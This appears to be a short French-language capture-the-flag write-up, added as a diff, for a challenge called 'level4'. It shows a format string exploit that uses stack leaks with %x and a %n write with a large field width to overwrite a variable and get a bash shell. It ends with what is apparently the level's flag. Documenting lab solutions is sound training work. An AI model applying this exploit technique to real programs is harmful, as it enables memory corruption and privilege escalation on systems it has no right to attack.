@@ -1,0 +1,14 @@
+level4 : 
+
+D'après le code il faut m = 0x1025544 = 16930116 pour exécuter bash
+address de m : 0x08049810 → /x10/x98/x04/x08 → info variable sur gdb
+
+Insérer l'adresse de m sur la stack et trouver sa position :
+(python -c "print '\x10\x98\x04\x08' + '%x '*16") | ./level4
+
+b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 8049810 25207825 78252078 20782520 25207825 
+l’adresse a été écrite sur la stack a la 12eme position
+
+(python -c "print '\x10\x98\x04\x08' + '%16930112x' + ‘%12\$n’") | ./level4 → utilisation de la width
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
